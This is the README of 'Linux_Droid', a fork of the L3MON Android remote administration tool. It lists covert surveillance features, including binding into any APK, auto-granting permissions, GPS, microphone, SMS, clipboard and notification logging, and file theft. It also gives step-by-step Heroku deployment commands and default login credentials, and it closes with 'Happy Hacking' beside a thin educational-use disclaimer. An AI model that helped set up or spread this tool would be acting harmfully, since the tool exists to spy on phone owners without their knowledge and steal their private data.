<p align="center">
<img src="https://github.com/Linux-Droid/Linux_Droid/blob/master/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features

- Auto Allow Permission
- Built In APK Builder
- Easy Bind Any Apk
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader

## Installation on VPS & PC [Click Here](https://github.com/Linux-Droid/Linux_Droid)

## Installation on Heroku Free Server
  
Video Tutorial For Setup [Click Hare](https://t.me/Linux_Droid)

0. Create a Account on [Heroku](https://heroku.com)

1. Click `Create New App` in Heroku Dashboard

2. Enter App Name and click on create app

3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)

4. Now open your terminal and run command `git clone -b herooku https://github.com/Linux-Droid/Linux_Droid`

5. It will download Latest codes for you in your PC
    
6. Now change the directory to Linux_Droid using command `cd Linux_Droid`

7. Now Login into Heroku CLI using command `heroku login -i` now enter your login details and hit Enter

8. After Login run this command in terminal `heroku git:remote -a appName` here appName will be your app's name that you choose while creating the app.

9. Now run follow commands in termial to install packages `heroku buildpacks:add heroku/jvm` then run `heroku buildpacks:add heroku/nodejs`

10. Now run this command in your terminal `git push heroku herooku:master`, if this gives an error try this `git push -f heroku herooku:master`

11. All done now it will take time to complete, after that you can visit your domain shown in terminal.
    

12. Default Username & Password. [You Can Check login_info.txt File]
    - Username: Linux
    - Password: Droid

## Happy Hacking
## Disclaimer
<b>Linux_Droid Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
Linux_Droid is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://t.me/Linux_Droid">Linux_Droid</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>